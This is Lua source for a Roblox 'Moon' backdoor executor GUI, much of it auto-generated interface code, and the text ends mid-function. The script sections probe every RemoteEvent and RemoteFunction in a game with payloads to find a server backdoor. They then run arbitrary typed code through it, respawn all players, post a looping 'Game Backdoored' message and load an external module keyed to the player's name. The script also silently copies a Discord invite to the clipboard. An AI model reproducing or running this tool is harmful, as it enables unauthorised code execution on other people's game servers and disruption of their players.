-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["8e"] = Instance.new("UIGradient", G2L["8c"]);
G2L["8e"]["Rotation"] = 90;
G2L["8e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["8f"] = Instance.new("TextButton", G2L["8a"]);
G2L["8f"]["BorderSizePixel"] = 0;
G2L["8f"]["TextSize"] = 22;
G2L["8f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["8f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8f"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["8f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8f"]["Text"] = [[Execute]];
G2L["8f"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["90"] = Instance.new("LocalScript", G2L["8f"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["91"] = Instance.new("UICorner", G2L["8f"]);
G2L["91"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["92"] = Instance.new("UICorner", G2L["8a"]);
G2L["92"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["93"] = Instance.new("TextLabel", G2L["8a"]);
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["TextSize"] = 32;
G2L["93"]["TextTransparency"] = 0.49;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["93"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["BackgroundTransparency"] = 1;
G2L["93"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["93"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["93"]["Text"] = [[Nuclear Gui]];
G2L["93"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["94"] = Instance.new("Frame", G2L["2d"]);
G2L["94"]["BorderSizePixel"] = 0;
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["94"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["94"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["95"] = Instance.new("UIStroke", G2L["94"]);
G2L["95"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["95"]["Thickness"] = 1.3;
G2L["95"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["96"] = Instance.new("ImageLabel", G2L["94"]);
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["96"]["Image"] = [[rbxassetid://132987071478963]];
G2L["96"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["97"] = Instance.new("UICorner", G2L["96"]);
G2L["97"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["98"] = Instance.new("UIGradient", G2L["96"]);
G2L["98"]["Rotation"] = 90;
G2L["98"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["99"] = Instance.new("TextButton", G2L["94"]);
G2L["99"]["BorderSizePixel"] = 0;
G2L["99"]["TextSize"] = 22;
G2L["99"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["99"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["99"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["99"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["99"]["Text"] = [[Execute]];
G2L["99"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["9a"] = Instance.new("LocalScript", G2L["99"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["9b"] = Instance.new("UICorner", G2L["99"]);
G2L["9b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["9c"] = Instance.new("UICorner", G2L["94"]);
G2L["9c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["9d"] = Instance.new("TextLabel", G2L["94"]);
G2L["9d"]["BorderSizePixel"] = 0;
G2L["9d"]["TextSize"] = 32;
G2L["9d"]["TextTransparency"] = 0.49;
G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9d"]["BackgroundTransparency"] = 1;
G2L["9d"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["9d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9d"]["Text"] = [[Police AI]];
G2L["9d"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["9e"] = Instance.new("Frame", G2L["2d"]);
G2L["9e"]["BorderSizePixel"] = 0;
G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["9e"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["9e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9e"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["9f"] = Instance.new("UIStroke", G2L["9e"]);
G2L["9f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["9f"]["Thickness"] = 1.3;
G2L["9f"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["a0"] = Instance.new("ImageLabel", G2L["9e"]);
G2L["a0"]["BorderSizePixel"] = 0;
G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a0"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["a0"]["Image"] = [[rbxassetid://116070945479545]];
G2L["a0"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a0"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["a1"] = Instance.new("UICorner", G2L["a0"]);
G2L["a1"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["a2"] = Instance.new("UIGradient", G2L["a0"]);
G2L["a2"]["Rotation"] = 90;
G2L["a2"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["a3"] = Instance.new("TextButton", G2L["9e"]);
G2L["a3"]["BorderSizePixel"] = 0;
G2L["a3"]["TextSize"] = 22;
G2L["a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a3"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a3"]["Text"] = [[Soon!!!]];
G2L["a3"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["a4"] = Instance.new("UICorner", G2L["a3"]);
G2L["a4"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["a5"] = Instance.new("UICorner", G2L["9e"]);
G2L["a5"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["a6"] = Instance.new("TextLabel", G2L["9e"]);
G2L["a6"]["BorderSizePixel"] = 0;
G2L["a6"]["TextSize"] = 32;
G2L["a6"]["TextTransparency"] = 0.49;
G2L["a6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a6"]["BackgroundTransparency"] = 1;
G2L["a6"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["a6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a6"]["Text"] = [[More Coming]];
G2L["a6"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.UICorner
G2L["a7"] = Instance.new("UICorner", G2L["23"]);
G2L["a7"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.RE
G2L["a8"] = Instance.new("TextButton", G2L["23"]);
G2L["a8"]["BorderSizePixel"] = 0;
G2L["a8"]["TextSize"] = 20;
G2L["a8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a8"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["a8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a8"]["ZIndex"] = 1000000000;
G2L["a8"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a8"]["Text"] = [[RE]];
G2L["a8"]["Name"] = [[RE]];
G2L["a8"]["Position"] = UDim2.new(0.62522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Hub.RE.LocalScript
G2L["a9"] = Instance.new("LocalScript", G2L["a8"]);



-- StarterGui.ScreenGui.Hub.RE.UICorner
G2L["aa"] = Instance.new("UICorner", G2L["a8"]);
G2L["aa"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Load.LocalScript
local function C_3()
	local script = G2L["3"];
	wait(5)

	local ok = script.Parent.Logo
	local oas = script.Parent.bg

	local function fade(obj, time)
		for i = 0.4, 1, 0.05 do
			obj.BackgroundTransparency = i
			obj.ImageTransparency = i
			wait(time)
		end
	end

	fade(ok, 0.05)
	fade(oas, 0.05)

	wait(0.05)
	script.Parent.Visible = false
	script.Parent.Parent.Main.Visible = true
end;
task.spawn(C_3);
-- StarterGui.ScreenGui.Load.bg.LocalScript
local function C_5()
	local script = G2L["5"];
	local UI_ELEMENT = script.Parent 
	local START_POSITION = UDim2.new(0.34, 0, 0.5, 0)
	local END_POSITION = UDim2.new(0.58, 0, 0.5, 0)
	local TWEEN_DURATION = 1.0
	local EASING_STYLE = Enum.EasingStyle.Sine 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 

	local tweenInfo = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		-1,
		true, 
		0 
	)


	local tween = game:GetService("TweenService"):Create(UI_ELEMENT, tweenInfo, {Position = END_POSITION})

	tween:Play()

end;
task.spawn(C_5);
-- StarterGui.ScreenGui.Load.Logo.LocalScript
local function C_7()
	local script = G2L["7"];
	local IMAGE_LOGO = script.Parent


	local ROTATION_ANGLE_1 = -5 
	local ROTATION_ANGLE_2 = 9  


	local TWEEN_DURATION = 1.0 
	local EASING_STYLE = Enum.EasingStyle.Quad 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 

	local tweenInfo1 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0 
	)

	local tweenInfo2 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0
	)


	local function startRotationLoop()
		while true do
			local tween1 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo1,
				{Rotation = ROTATION_ANGLE_1}
			)
			tween1:Play()
			tween1.Completed:Wait()

			local tween2 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo2,
				{Rotation = ROTATION_ANGLE_2}
			)
			tween2:Play()
			tween2.Completed:Wait() 
		end
	end


	startRotationLoop()
end;
task.spawn(C_7);
-- StarterGui.ScreenGui.Main.UIDrag
local function C_b()
	local script = G2L["b"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_b);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_c()
	local script = G2L["c"];
	game.StarterGui:SetCore("SendNotification", {
		Title = "Moon",
		Text = "Please Join Our Server.",
		Icon = "rbxassetid://7395824155",
		Duration = 10,
	})

	setclipboard("https://discord.gg/W5bNxXf85r")
end;
task.spawn(C_c);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_d()
	local script = G2L["d"];
	local buttons = {
		Exe = script.Parent.Buttons.Exe;
		clear = script.Parent.Buttons.Clear;
		connect = script.Parent.Connect;
	}

	local statustext = script.Parent.Stats
	local codeBar = script.Parent.CodeBar

	local statusIcons = {
		Offline = "🔴";
		Checking = "🟠";
		Allow = "🟢";
	}

	local function setStatus(key)
		if key == "O" then
			statustext.Text = statusIcons.Offline
		elseif key == "C" then
			statustext.Text = statusIcons.Checking
		elseif key == "B" then
			statustext.Text = statusIcons.Allow
		end
	end

	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0 

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end


		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local RE = [[
		for _, lol in pairs(game.Players:GetPlayers()) do
			lol:LoadCharacter()
		end
		]]








		local Hint = [[
		local hint = Instance.new("Hint", game.Workspace)
		hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		
		while true do
			wait(5)
			hint:Destroy()
			wait(5)
			local hint = Instance.new("Hint", game.Workspace)
			hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		end
		]]

		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(RE) end)
					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(RE) end)
				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
			end
		end)

		return testId
	end

	local function simpleFindRemote()
		setStatus("C")
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0 
		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock() 
		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01 or 0.05 or 0.5
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end

	local exeConnection
	local function updateExeButton()
		if exeConnection then
			exeConnection:Disconnect()
			exeConnection = nil
		end
		if foundExploit then
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				local code = codeBar.Text
				if code and code ~= "" then
					if remoteEvent then
						print("ℹ️ Executing via RemoteEvent:", remoteEvent:GetFullName())
						pcall(function() remoteEvent:FireServer(code) end)
					elseif remoteFunction then
						print("ℹ️ Executing via RemoteFunction:", remoteFunction:GetFullName())
						pcall(function()
							remoteFunction:InvokeServer("moonTSS", code)
						end)
					end
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "Code executed through backdoor",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				else
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "No Code to Execute",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				end
			end)
		else
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				StarterGui:SetCore("SendNotification", {
					Title = "Moon",
					Text = "No Backdoor Found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end)
		end
	end

	buttons.connect.MouseButton1Click:Connect(function()
		setStatus("C")
		StarterGui:SetCore("SendNotification", {
			Title = "Moon",
			Text = "Checking for backdoors...",
			Icon = "rbxassetid://7395824155",
			Duration = 3,
		})
		task.spawn(function()
			local scanStart = os.clock() 
			simpleFindRemote()
			local scanEnd = os.clock()
			print(string.format("🌙 moon: Scan completed in %.2f ms", (scanEnd - scanStart) * 1000))

			if foundExploit then
				setStatus("B")
				local formattedTime = string.format("%.2f", timeToFindExploit)
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "Backdoor found in " .. formattedTime .. " seconds!",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			else
				setStatus("O")
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "No backdoor found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end
			updateExeButton()
		end)
	end)

	buttons.clear.MouseButton1Click:Connect(function()
		codeBar.Text = ""
	end)

	setStatus("O")
	updateExeButton()
end;
task.spawn(C_d);
-- StarterGui.ScreenGui.Main.Hub.LocalScript
local function C_21()
	local script = G2L["21"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.Hub.Visible = true
	end)
end;
task.spawn(C_21);
-- StarterGui.ScreenGui.Hub.UIDrag
local function C_24()
	local script = G2L["24"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_24);
-- StarterGui.ScreenGui.Hub.Hub.LocalScript
local function C_2b()
	local script = G2L["2b"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.Main.Visible = true
	end)
end;
task.spawn(C_2b);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_36()
	local script = G2L["36"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(4513235536).G(']] .. player.Name .. [[')]]

		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end

	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else
		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_36);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_40()
	local script = G2L["40"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

